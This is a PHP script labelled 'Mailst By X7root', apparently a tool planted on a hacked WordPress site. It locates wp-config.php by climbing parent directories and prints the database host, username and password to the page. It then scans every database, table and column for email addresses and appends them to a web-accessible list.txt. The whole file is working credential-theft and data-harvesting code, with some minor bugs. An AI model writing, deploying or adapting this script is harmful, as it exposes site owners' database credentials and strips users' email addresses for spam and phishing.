<?php
echo " 
<html>
<center><a href='list.txt'>Mailst By X7root</a><br>
</html>
";
if (file_exists("wp-config.php") or ("../wp-config.php") or ("../../wp-config.php") or ("../../../wp-config.php") or ("../../../../wp-config.php") or ("../../../../../wp-config.php") or ("../../../../../../wp-config.php"))
{
    $config = array(
        "wp-config.php",
        "../wp-config.php",
        "../../wp-config.php",
        "../../../wp-config.php",
        "../../../../wp-config.php",
        "../../../../../wp-config.php",
        "../../../../../../wp-config.php"
    );
    foreach ($config as $wpcon)
    {
        $file = @file_get_contents($wpcon);
        if (@preg_match("/'DB_NAME', '/", $file) or @eregi("/'DB_USER', '/", $file))
        {
            //////////host////////////////
            //////////host////////////////
            $host = explode("'DB_HOST', '", $file);
            $host = explode("');", $host[1]);
            $host = $host[0];
            /////////user///////////////
            $user = explode("'DB_USER', '", $file);
            $user = explode("');", $user[1]);
            $user = $user[0];
            ////////password///////////
            $pass = explode("'DB_PASSWORD', '", $file);
            $pass = explode("');", $pass[1]);
            $pass = $pass[0];
            ///////////////////////////////////////
            echo "db-host : $host <br>";
            echo "db-user : $user <br>";
            echo "db-pass : $pass <br>";
            //////////////////////////////////////////////////////////////////////////
            go($host, $user, $pass, "list.txt");
            exit();
        }
    }
}
else
{
    echo "i dontknow :/ \n\n";

}

function go($host, $user, $pass, $file)
{
    $con = @mysqli_connect($host, $user, $pass);
    $fp = fopen($file, 'a');
    $count = 0;
    $databases = getdata("SHOW DATABASES");
    foreach ($databases as $database)
    print $database;
    {
        $tables = getdata("SHOW TABLES FROM $database");
        foreach ($tables as $table)
        {
            $columns = getdata("SHOW COLUMNS FROM $database.$table");
            foreach ($columns as $column)
            {
                $emails = getdata("SELECT $column FROM  $database.$table WHERE $column REGEXP '[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]'");
                foreach ($emails as $email)
                {
                    if (filter_var($email, FILTER_VALIDATE_EMAIL))
                    {
                        if (preg_match("/".$email."/", file_get_contents($file))) continue;
                        $count++;
                        fwrite($fp, "$email\n");
                    }
                    else
                    {
                        foreach (preg_split("/\s/", $text) as $string)
                        {
                            if (filter_var($string, FILTER_VALIDATE_EMAIL))
                            {
                                if (preg_match("/".$string."/", file_get_contents($file))) continue;
                                $count++;
                                fwrite($fp, "$string\n");
                            }
                        }
                    }
                }
            }
        }
    }
    fclose($fp);
    @mysqli_close($con);
    return $count;
}
function getdata($sql)
{
    require('wp-config.php');
    $link = mysqli_connect(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME);
    $q = @mysqli_query($link,$sql);
    $result = array();
    while ($d = @mysqli_fetch_array($q))
    {
        $result[] = $d[0];
    }
    return $result;
}
?>
